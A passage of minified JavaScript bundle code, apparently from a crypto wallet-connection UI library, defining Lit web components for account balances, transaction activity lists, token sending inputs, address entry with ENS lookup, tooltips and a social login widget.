pennies="00"></wui-balance>`}onTabChange(e){Se.setCurrentTab(e)}onProfileButtonClick(){const{allAccounts:e}=Se.state;e.length>1?Ee.push("Profile"):Ee.push("AccountSettings")}onBuyClick(){Ee.push("OnRampProviders")}onSwapClick(){this.network?.caipNetworkId&&!kr.SWAP_SUPPORTED_NETWORKS.includes(this.network?.caipNetworkId)?Ee.push("UnsupportedChain",{swapUnsupportedChain:!0}):(Ve.sendEvent({type:"track",event:"OPEN_SWAP",properties:{network:this.network?.caipNetworkId||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("Swap"))}onReceiveClick(){Ee.push("WalletReceive")}onSendClick(){Ve.sendEvent({type:"track",event:"OPEN_SEND",properties:{network:this.network?.caipNetworkId||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("WalletSend")}};ul.styles=fMe;nh([te()],ul.prototype,"watchTokenBalance",void 0);nh([te()],ul.prototype,"address",void 0);nh([te()],ul.prototype,"profileImage",void 0);nh([te()],ul.prototype,"profileName",void 0);nh([te()],ul.prototype,"network",void 0);nh([te()],ul.prototype,"currentTab",void 0);nh([te()],ul.prototype,"tokenBalance",void 0);nh([te()],ul.prototype,"features",void 0);nh([te()],ul.prototype,"networkImage",void 0);ul=nh([me("w3m-account-wallet-features-widget")],ul);const wMe=ge`
  :host {
    width: 100%;
    max-height: 280px;
    overflow: scroll;
    scrollbar-width: none;
  }

  :host::-webkit-scrollbar {
    display: none;
  }
`;var bMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Qk=class extends he{render(){return F`<w3m-activity-list page="account"></w3m-activity-list>`}};Qk.styles=wMe;Qk=bMe([me("w3m-account-activity-widget")],Qk);const vMe=ge`
  .contentContainer {
    height: 280px;
  }

  .contentContainer > wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-xxs);
  }

  .contentContainer > .textContent {
    width: 65%;
  }
`;var yMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Xk=class extends he{render(){return F`${this.nftTemplate()}`}nftTemplate(){return F` <wui-flex
      class="contentContainer"
      alignItems="center"
      justifyContent="center"
      flexDirection="column"
      gap="l"
    >
      <wui-icon-box
        icon="wallet"
        size="inherit"
        iconColor="fg-200"
        backgroundColor="fg-200"
        iconSize="lg"
      ></wui-icon-box>
      <wui-flex
        class="textContent"
        gap="xs"
        flexDirection="column"
        justifyContent="center"
        flexDirection="column"
      >
        <wui-text
          variant="paragraph-500"
          align="center"
          color="fg-100"
          data-testid="nft-template-title"
          >Coming soon</wui-text
        >
        <wui-text
          variant="small-400"
          align="center"
          color="fg-200"
          data-testid="nft-template-description"
          >Stay tuned for our upcoming NFT feature</wui-text
        >
      </wui-flex>
      <wui-link @click=${this.onReceiveClick.bind(this)} data-testid="link-receive-funds"
        >Receive funds</wui-link
      >
    </wui-flex>`}onReceiveClick(){Ee.push("WalletReceive")}};Xk.styles=vMe;Xk=yMe([me("w3m-account-nfts-widget")],Xk);const xMe=ge`
  :host {
    width: 100%;
  }

  wui-flex {
    width: 100%;
  }

  .contentContainer {
    max-height: 280px;
    overflow: scroll;
    scrollbar-width: none;
  }

  .contentContainer::-webkit-scrollbar {
    display: none;
  }
`;var rte=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let D7=class extends he{constructor(){super(),this.unsubscribe=[],this.tokenBalance=Se.state.tokenBalance,this.unsubscribe.push(Se.subscribe(e=>{this.tokenBalance=e.tokenBalance}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`${this.tokenTemplate()}`}tokenTemplate(){return this.tokenBalance&&this.tokenBalance?.length>0?F`<wui-flex class="contentContainer" flexDirection="column" gap="xs">
        ${this.tokenItemTemplate()}
      </wui-flex>`:F` <wui-flex flexDirection="column" gap="xs"
      ><wui-list-description
        @click=${this.onBuyClick.bind(this)}
        text="Buy Crypto"
        description="Easy with card or bank account"
        icon="card"
        iconColor="success-100"
        iconBackgroundColor="success-100"
        tag="popular"
        data-testid="buy-crypto"
      ></wui-list-description
      ><wui-list-description
        @click=${this.onReceiveClick.bind(this)}
        text="Receive funds"
        description="Transfer tokens on your wallet"
        icon="arrowBottomCircle"
        iconColor="fg-200"
        iconBackgroundColor="fg-200"
        data-testid="receive-funds"
      ></wui-list-description
    ></wui-flex>`}tokenItemTemplate(){return this.tokenBalance?.map(e=>F`<wui-list-token
          tokenName=${e.name}
          tokenImageUrl=${e.iconUrl}
          tokenAmount=${e.quantity.numeric}
          tokenValue=${e.value}
          tokenCurrency=${e.symbol}
        ></wui-list-token>`)}onReceiveClick(){Ee.push("WalletReceive")}onBuyClick(){Ve.sendEvent({type:"track",event:"SELECT_BUY_CRYPTO",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("OnRampProviders")}};D7.styles=xMe;rte([te()],D7.prototype,"tokenBalance",void 0);D7=rte([me("w3m-account-tokens-widget")],D7);const CMe=ge`
  :host {
    min-height: 100%;
  }

  .group-container[last-group='true'] {
    padding-bottom: var(--wui-spacing-m);
  }

  .contentContainer {
    height: 280px;
  }

  .contentContainer > wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-xxs);
  }

  .contentContainer > .textContent {
    width: 65%;
  }

  .emptyContainer {
    height: 100%;
  }
`;var x2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const a8="last-transaction",EMe=7;let v0=class extends he{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.page="activity",this.caipAddress=re.state.activeCaipAddress,this.transactionsByYear=vs.state.transactionsByYear,this.loading=vs.state.loading,this.empty=vs.state.empty,this.next=vs.state.next,vs.clearCursor(),this.unsubscribe.push(re.subscribeKey("activeCaipAddress",e=>{e&&this.caipAddress!==e&&(vs.resetTransactions(),vs.fetchTransactions(e)),this.caipAddress=e}),re.subscribeKey("activeCaipNetwork",()=>{this.updateTransactionView()}),vs.subscribe(e=>{this.transactionsByYear=e.transactionsByYear,this.loading=e.loading,this.empty=e.empty,this.next=e.next}))}firstUpdated(){this.updateTransactionView(),this.createPaginationObserver()}updated(){this.setPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F` ${this.empty?null:this.templateTransactionsByYear()}
    ${this.loading?this.templateLoading():null}
    ${!this.loading&&this.empty?this.templateEmpty():null}`}updateTransactionView(){const e=re.state.activeCaipNetwork?.caipNetworkId;vs.state.lastNetworkInView!==e&&(vs.resetTransactions(),this.caipAddress&&vs.fetchTransactions(ke.getPlainAddress(this.caipAddress))),vs.setLastNetworkInView(e)}templateTransactionsByYear(){return Object.keys(this.transactionsByYear).sort().reverse().map(t=>{const i=parseInt(t,10),n=new Array(12).fill(null).map((s,o)=>{const a=Of.getTransactionGroupTitle(i,o),c=this.transactionsByYear[i]?.[o];return{groupTitle:a,transactions:c}}).filter(({transactions:s})=>s).reverse();return n.map(({groupTitle:s,transactions:o},a)=>{const c=a===n.length-1;return o?F`
          <wui-flex
            flexDirection="column"
            class="group-container"
            last-group="${c?"true":"false"}"
            data-testid="month-indexes"
          >
            <wui-flex
              alignItems="center"
              flexDirection="row"
              .padding=${["xs","s","s","s"]}
            >
              <wui-text variant="paragraph-500" color="fg-200" data-testid="group-title"
                >${s}</wui-text
              >
            </wui-flex>
            <wui-flex flexDirection="column" gap="xs">
              ${this.templateTransactions(o,c)}
            </wui-flex>
          </wui-flex>
        `:null})})}templateRenderTransaction(e,t){const{date:i,descriptions:n,direction:s,isAllNFT:o,images:a,status:c,transfers:l,type:u}=this.getTransactionListItemProps(e),d=l?.length>1;return l?.length===2&&!o?F`
        <wui-transaction-list-item
          date=${i}
          .direction=${s}
          id=${t&&this.next?a8:""}
          status=${c}
          type=${u}
          .images=${a}
          .descriptions=${n}
        ></wui-transaction-list-item>
      `:d?l.map((f,p)=>{const g=Of.getTransferDescription(f),w=t&&p===l.length-1;return F` <wui-transaction-list-item
          date=${i}
          direction=${f.direction}
          id=${w&&this.next?a8:""}
          status=${c}
          type=${u}
          .onlyDirectionIcon=${!0}
          .images=${[a[p]]}
          .descriptions=${[g]}
        ></wui-transaction-list-item>`}):F`
      <wui-transaction-list-item
        date=${i}
        .direction=${s}
        id=${t&&this.next?a8:""}
        status=${c}
        type=${u}
        .images=${a}
        .descriptions=${n}
      ></wui-transaction-list-item>
    `}templateTransactions(e,t){return e.map((i,n)=>{const s=t&&n===e.length-1;return F`${this.templateRenderTransaction(i,s)}`})}emptyStateActivity(){return F`<wui-flex
      class="emptyContainer"
      flexGrow="1"
      flexDirection="column"
      justifyContent="center"
      alignItems="center"
      .padding=${["3xl","xl","3xl","xl"]}
      gap="xl"
      data-testid="empty-activity-state"
    >
      <wui-icon-box
        backgroundColor="gray-glass-005"
        background="gray"
        iconColor="fg-200"
        icon="wallet"
        size="lg"
        ?border=${!0}
        borderColor="wui-color-bg-125"
      ></wui-icon-box>
      <wui-flex flexDirection="column" alignItems="center" gap="xs">
        <wui-text align="center" variant="paragraph-500" color="fg-100"
          >No Transactions yet</wui-text
        >
        <wui-text align="center" variant="small-500" color="fg-200"
          >Start trading on dApps <br />
          to grow your wallet!</wui-text
        >
      </wui-flex>
    </wui-flex>`}emptyStateAccount(){return F`<wui-flex
      class="contentContainer"
      alignItems="center"
      justifyContent="center"
      flexDirection="column"
      gap="l"
      data-testid="empty-account-state"
    >
      <wui-icon-box
        icon="swapHorizontal"
        size="inherit"
        iconColor="fg-200"
        backgroundColor="fg-200"
        iconSize="lg"
      ></wui-icon-box>
      <wui-flex
        class="textContent"
        gap="xs"
        flexDirection="column"
        justifyContent="center"
        flexDirection="column"
      >
        <wui-text variant="paragraph-500" align="center" color="fg-100">No activity yet</wui-text>
        <wui-text variant="small-400" align="center" color="fg-200"
          >Your next transactions will appear here</wui-text
        >
      </wui-flex>
      <wui-link @click=${this.onReceiveClick.bind(this)}>Trade</wui-link>
    </wui-flex>`}templateEmpty(){return this.page==="account"?F`${this.emptyStateAccount()}`:F`${this.emptyStateActivity()}`}templateLoading(){return this.page==="activity"?Array(EMe).fill(F` <wui-transaction-list-item-loader></wui-transaction-list-item-loader> `).map(e=>e):null}onReceiveClick(){Ee.push("WalletReceive")}createPaginationObserver(){const{projectId:e}=Ne.state;this.paginationObserver=new IntersectionObserver(([t])=>{t?.isIntersecting&&!this.loading&&(vs.fetchTransactions(ke.getPlainAddress(this.caipAddress)),Ve.sendEvent({type:"track",event:"LOAD_MORE_TRANSACTIONS",properties:{address:ke.getPlainAddress(this.caipAddress),projectId:e,cursor:this.next,isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}))},{}),this.setPaginationObserver()}setPaginationObserver(){this.paginationObserver?.disconnect();const e=this.shadowRoot?.querySelector(`#${a8}`);e&&this.paginationObserver?.observe(e)}getTransactionListItemProps(e){const t=V9.formatDate(e?.metadata?.minedAt),i=Of.getTransactionDescriptions(e),n=e?.transfers,s=e?.transfers?.[0],o=!!s&&e?.transfers?.every(c=>!!c.nft_info),a=Of.getTransactionImages(n);return{date:t,direction:s?.direction,descriptions:i,isAllNFT:o,images:a,status:e.metadata?.status,transfers:n,type:e.metadata?.operationType}}};v0.styles=CMe;x2([V()],v0.prototype,"page",void 0);x2([te()],v0.prototype,"caipAddress",void 0);x2([te()],v0.prototype,"transactionsByYear",void 0);x2([te()],v0.prototype,"loading",void 0);x2([te()],v0.prototype,"empty",void 0);x2([te()],v0.prototype,"next",void 0);v0=x2([me("w3m-activity-list")],v0);const _Me=ge`
  :host {
    width: 100%;
    height: 100px;
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-002);
    background-color: var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color;
  }

  :host(:hover) {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-flex {
    width: 100%;
    height: fit-content;
  }

  wui-button {
    width: 100%;
    display: flex;
    justify-content: flex-end;
  }

  wui-input-amount {
    mask-image: linear-gradient(
      270deg,
      transparent 0px,
      transparent 8px,
      black 24px,
      black 25px,
      black 32px,
      black 100%
    );
  }

  .totalValue {
    width: 100%;
  }
`;var L4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let _g=class extends he{render(){return F` <wui-flex
      flexDirection="column"
      gap="4xs"
      .padding=${["xl","s","l","l"]}
    >
      <wui-flex alignItems="center">
        <wui-input-amount
          @inputChange=${this.onInputChange.bind(this)}
          ?disabled=${!this.token&&!0}
          .value=${this.sendTokenAmount?String(this.sendTokenAmount):""}
        ></wui-input-amount>
        ${this.buttonTemplate()}
      </wui-flex>
      <wui-flex alignItems="center" justifyContent="space-between">
        ${this.sendValueTemplate()}
        <wui-flex alignItems="center" gap="4xs" justifyContent="flex-end">
          ${this.maxAmountTemplate()} ${this.actionTemplate()}
        </wui-flex>
      </wui-flex>
    </wui-flex>`}buttonTemplate(){return this.token?F`<wui-token-button
        text=${this.token.symbol}
        imageSrc=${this.token.iconUrl}
        @click=${this.handleSelectButtonClick.bind(this)}
      >
      </wui-token-button>`:F`<wui-button
      size="md"
      variant="accent"
      @click=${this.handleSelectButtonClick.bind(this)}
      >Select token</wui-button
    >`}handleSelectButtonClick(){Ee.push("WalletSendSelectToken")}sendValueTemplate(){if(this.token&&this.sendTokenAmount){const t=this.token.price*this.sendTokenAmount;return F`<wui-text class="totalValue" variant="small-400" color="fg-200"
        >${t?`$${Wt.formatNumberToLocalString(t,2)}`:"Incorrect value"}</wui-text
      >`}return null}maxAmountTemplate(){return this.token?this.sendTokenAmount&&this.sendTokenAmount>Number(this.token.quantity.numeric)?F` <wui-text variant="small-400" color="error-100">
          ${Wt.roundNumber(Number(this.token.quantity.numeric),6,5)}
        </wui-text>`:F` <wui-text variant="small-400" color="fg-200">
        ${Wt.roundNumber(Number(this.token.quantity.numeric),6,5)}
      </wui-text>`:null}actionTemplate(){return this.token?this.sendTokenAmount&&this.sendTokenAmount>Number(this.token.quantity.numeric)?F`<wui-link @click=${this.onBuyClick.bind(this)}>Buy</wui-link>`:F`<wui-link @click=${this.onMaxClick.bind(this)}>Max</wui-link>`:null}onInputChange(e){Dr.setTokenAmount(e.detail)}onMaxClick(){if(this.token&&typeof this.gasPrice<"u"){const e=this.token.address===void 0||Object.values(kr.NATIVE_TOKEN_ADDRESS).some(n=>this.token?.address===n),t=Tr.bigNumber(this.gasPrice).div(Tr.bigNumber(10).pow(Number(this.token.quantity.decimals))),i=e?Tr.bigNumber(this.token.quantity.numeric).minus(t):Tr.bigNumber(this.token.quantity.numeric);Dr.setTokenAmount(Number(i.toFixed(20)))}}onBuyClick(){Ee.push("OnRampProviders")}};_g.styles=_Me;L4([V({type:Object})],_g.prototype,"token",void 0);L4([V({type:Number})],_g.prototype,"sendTokenAmount",void 0);L4([V({type:Number})],_g.prototype,"gasPriceInUSD",void 0);L4([V({type:Number})],_g.prototype,"gasPrice",void 0);_g=L4([me("w3m-input-token")],_g);const SMe=ge`
  :host {
    width: 100%;
    height: 100px;
    border-radius: var(--wui-border-radius-s);
    border: 1px solid var(--wui-color-gray-glass-002);
    background-color: var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color;
    position: relative;
  }

  :host(:hover) {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-flex {
    width: 100%;
    height: fit-content;
  }

  wui-button {
    display: ruby;
    color: var(--wui-color-fg-100);
    margin: 0 var(--wui-spacing-xs);
  }

  .instruction {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    z-index: 2;
  }

  .paste {
    display: inline-flex;
  }

  textarea {
    background: transparent;
    width: 100%;
    font-family: var(--w3m-font-family);
    font-size: var(--wui-font-size-medium);
    font-style: normal;
    font-weight: var(--wui-font-weight-light);
    line-height: 130%;
    letter-spacing: var(--wui-letter-spacing-medium);
    color: var(--wui-color-fg-100);
    caret-color: var(--wui-color-accent-100);
    box-sizing: border-box;
    -webkit-appearance: none;
    -moz-appearance: textfield;
    padding: 0px;
    border: none;
    outline: none;
    appearance: none;
    resize: none;
    overflow: hidden;
  }
`;var DC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Kw=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.instructionElementRef=gc(),this.instructionHidden=!!this.value,this.pasting=!1,this.onDebouncedSearch=ke.debounce(async e=>{const t=await ft.getEnsAddress(e);if(Dr.setLoading(!1),t){Dr.setReceiverProfileName(e),Dr.setReceiverAddress(t);const i=await ft.getEnsAvatar(e);Dr.setReceiverProfileImageUrl(i||void 0)}else Dr.setReceiverAddress(e),Dr.setReceiverProfileName(void 0),Dr.setReceiverProfileImageUrl(void 0)})}firstUpdated(){this.value&&(this.instructionHidden=!0),this.checkHidden()}render(){return F` <wui-flex
      @click=${this.onBoxClick.bind(this)}
      flexDirection="column"
      justifyContent="center"
      gap="4xs"
      .padding=${["2xl","l","xl","l"]}
    >
      <wui-text
        ${mc(this.instructionElementRef)}
        class="instruction"
        color="fg-300"
        variant="medium-400"
      >
        Type or
        <wui-button
          class="paste"
          size="md"
          variant="neutral"
          iconLeft="copy"
          @click=${this.onPasteClick.bind(this)}
        >
          <wui-icon size="sm" color="inherit" slot="iconLeft" name="copy"></wui-icon>
          Paste
        </wui-button>
        address
      </wui-text>
      <textarea
        spellcheck="false"
        ?disabled=${!this.instructionHidden}
        ${mc(this.inputElementRef)}
        @input=${this.onInputChange.bind(this)}
        @blur=${this.onBlur.bind(this)}
        .value=${this.value??""}
        autocomplete="off"
      >
${this.value??""}</textarea
      >
    </wui-flex>`}async focusInput(){this.instructionElementRef.value&&(this.instructionHidden=!0,await this.toggleInstructionFocus(!1),this.instructionElementRef.value.style.pointerEvents="none",this.inputElementRef.value?.focus(),this.inputElementRef.value&&(this.inputElementRef.value.selectionStart=this.inputElementRef.value.selectionEnd=this.inputElementRef.value.value.length))}async focusInstruction(){this.instructionElementRef.value&&(this.instructionHidden=!1,await this.toggleInstructionFocus(!0),this.instructionElementRef.value.style.pointerEvents="auto",this.inputElementRef.value?.blur())}async toggleInstructionFocus(e){this.instructionElementRef.value&&await this.instructionElementRef.value.animate([{opacity:e?0:1},{opacity:e?1:0}],{duration:100,easing:"ease",fill:"forwards"}).finished}onBoxClick(){!this.value&&!this.instructionHidden&&this.focusInput()}onBlur(){!this.value&&this.instructionHidden&&!this.pasting&&this.focusInstruction()}checkHidden(){this.instructionHidden&&this.focusInput()}async onPasteClick(){this.pasting=!0;const e=await navigator.clipboard.readText();Dr.setReceiverAddress(e),this.focusInput()}onInputChange(e){this.pasting=!1;const t=e.target;t.value&&!this.instructionHidden&&this.focusInput(),Dr.setLoading(!0),this.onDebouncedSearch(t.value)}};Kw.styles=SMe;DC([V()],Kw.prototype,"value",void 0);DC([te()],Kw.prototype,"instructionHidden",void 0);DC([te()],Kw.prototype,"pasting",void 0);Kw=DC([me("w3m-input-address")],Kw);const AMe=ge`
  :host {
    display: flex;
    width: auto;
    flex-direction: column;
    gap: var(--wui-border-radius-1xs);
    border-radius: var(--wui-border-radius-s);
    background: var(--wui-color-gray-glass-002);
    padding: var(--wui-spacing-s) var(--wui-spacing-1xs) var(--wui-spacing-1xs)
      var(--wui-spacing-1xs);
  }

  wui-text {
    padding: 0 var(--wui-spacing-1xs);
  }

  wui-flex {
    margin-top: var(--wui-spacing-1xs);
  }

  .network {
    cursor: pointer;
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color;
  }

  .network:focus-visible {
    border: 1px solid var(--wui-color-accent-100);
    background-color: var(--wui-color-gray-glass-005);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  .network:hover {
    background-color: var(--wui-color-gray-glass-005);
  }

  .network:active {
    background-color: var(--wui-color-gray-glass-010);
  }
`;var LC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Gw=class extends he{render(){return F` <wui-text variant="small-400" color="fg-200">Details</wui-text>
      <wui-flex flexDirection="column" gap="xxs">
        <wui-list-content textTitle="Network cost" textValue="$${ye(Wt.formatNumberToLocalString(this.networkFee,2))}"></wui-list-content></wui-list-content>
        <wui-list-content
          textTitle="Address"
          textValue=${Wt.getTruncateString({string:this.receiverAddress??"",charsStart:4,charsEnd:4,truncate:"middle"})}
        >
        </wui-list-content>
        ${this.networkTemplate()}
      </wui-flex>`}networkTemplate(){return this.caipNetwork?.name?F` <wui-list-content
        @click=${()=>this.onNetworkClick(this.caipNetwork)}
        class="network"
        textTitle="Network"
        imageSrc=${ye(Nr.getNetworkImage(this.caipNetwork))}
      ></wui-list-content>`:null}onNetworkClick(e){e&&Ee.push("Networks",{network:e})}};Gw.styles=AMe;LC([V()],Gw.prototype,"receiverAddress",void 0);LC([V({type:Object})],Gw.prototype,"caipNetwork",void 0);LC([V({type:Number})],Gw.prototype,"networkFee",void 0);Gw=LC([me("w3m-wallet-send-details")],Gw);const IMe=ge`
  :host {
    pointer-events: none;
  }

  :host > wui-flex {
    display: var(--w3m-tooltip-display);
    opacity: var(--w3m-tooltip-opacity);
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    color: var(--wui-color-bg-100);
    position: fixed;
    top: var(--w3m-tooltip-top);
    left: var(--w3m-tooltip-left);
    transform: translate(calc(-50% + var(--w3m-tooltip-parent-width)), calc(-100% - 8px));
    max-width: calc(var(--w3m-modal-width) - var(--wui-spacing-xl));
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host([data-variant='shade']) > wui-flex {
    background-color: var(--wui-color-bg-150);
    border: 1px solid var(--wui-color-gray-glass-005);
  }

  :host([data-variant='shade']) > wui-flex > wui-text {
    color: var(--wui-color-fg-150);
  }

  :host([data-variant='fill']) > wui-flex {
    background-color: var(--wui-color-fg-100);
    border: none;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
    color: var(--wui-color-bg-150);
  }

  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var U4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Sg=class extends he{constructor(){super(),this.unsubscribe=[],this.open=oc.state.open,this.message=oc.state.message,this.triggerRect=oc.state.triggerRect,this.variant=oc.state.variant,this.unsubscribe.push(oc.subscribe(e=>{this.open=e.open,this.message=e.message,this.triggerRect=e.triggerRect,this.variant=e.variant}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){this.dataset.variant=this.variant;const e=this.triggerRect.top,t=this.triggerRect.left;return this.style.cssText=`
    --w3m-tooltip-top: ${e}px;
    --w3m-tooltip-left: ${t}px;
    --w3m-tooltip-parent-width: ${this.triggerRect.width/2}px;
    --w3m-tooltip-display: ${this.open?"flex":"none"};
    --w3m-tooltip-opacity: ${this.open?1:0};
    `,F`<wui-flex>
      <wui-icon data-placement="top" color="fg-100" size="inherit" name="cursor"></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>
    </wui-flex>`}};Sg.styles=[IMe];U4([te()],Sg.prototype,"open",void 0);U4([te()],Sg.prototype,"message",void 0);U4([te()],Sg.prototype,"triggerRect",void 0);U4([te()],Sg.prototype,"variant",void 0);Sg=U4([me("w3m-tooltip")],Sg);const TMe=ge`
  :host {
    width: 100%;
    display: block;
  }
`;var tO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let py=class extends he{constructor(){super(),this.unsubscribe=[],this.text="",this.open=oc.state.open,this.unsubscribe.push(Ee.subscribeKey("view",()=>{oc.hide()}),Ut.subscribeKey("open",e=>{e||oc.hide()}),oc.subscribeKey("open",e=>{this.open=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),oc.hide()}render(){return F`
      <div
        @pointermove=${this.onMouseEnter.bind(this)}
        @pointerleave=${this.onMouseLeave.bind(this)}
      >
        ${this.renderChildren()}
      </div>
    `}renderChildren(){return F`<slot></slot> `}onMouseEnter(){const e=this.getBoundingClientRect();this.open||oc.showTooltip({message:this.text,triggerRect:{width:e.width,height:e.height,left:e.left,top:e.top},variant:"shade"})}onMouseLeave(e){this.contains(e.relatedTarget)||oc.hide()}};py.styles=[TMe];tO([V()],py.prototype,"text",void 0);tO([te()],py.prototype,"open",void 0);py=tO([me("w3m-tooltip-trigger")],py);const kMe=ge`
  wui-separator {
    margin: var(--wui-spacing-m) calc(var(--wui-spacing-m) * -1) var(--wui-spacing-m)
      calc(var(--wui-spacing-m) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`;var O3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const az=2,cz=6;let bp=class extends he{constructor(){super(),this.unsubscribe=[],this.walletGuide="get-started",this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.features=Ne.state.features,this.authConnector=this.connectors.find(e=>e.type==="AUTH"),this.unsubscribe.push(Xe.subscribeKey("connectors",e=>{this.connectors=e,this.authConnector=this.connectors.find(t=>t.type==="AUTH")}),Ne.subscribeKey("features",e=>this.features=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex
        class="container"
        flexDirection="column"
        gap="xs"
        data-testid="w3m-social-login-widget"
      >
        ${this.topViewTemplate()}${this.bottomViewTemplate()}
      </wui-flex>
    `}topViewTemplate(){const e=this.walletGuide==="explore";let t=this.features?.socials;return!t&&e?(t=kr.DEFAULT_FEATURES.socials,this.renderTopViewContent(t)):t?this.renderTopViewContent(t):null}renderTopViewContent(e){return e.length===2?F` <wui-flex gap="xs">
        ${e.slice(0,az).map(t=>F`<wui-logo-select
              data-testid=${`social-selector-${t}`}
              @click=${()=>{this.onSocialClick(t)}}
              logo=${t}
